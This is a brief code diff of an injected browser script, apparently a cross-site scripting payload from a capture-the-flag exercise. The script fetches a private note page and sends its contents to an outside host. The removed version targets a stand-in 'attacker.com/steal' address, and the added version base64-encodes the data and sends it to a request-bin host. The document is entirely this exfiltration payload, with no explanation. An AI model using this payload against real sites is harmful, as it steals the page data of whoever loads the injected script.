@@ -1,7 +1,5 @@
 <script>
-fetch("/note?id=4")
+fetch('/note?id=4')
   .then(r => r.text())
-  .then(t => {
-    fetch("http://attacker.com/steal?data=" + encodeURIComponent(t))
-  })
+  .then(t => fetch('https://chmfxyv.request.dreamhack.games/?data=' + btoa(t)))
 </script>
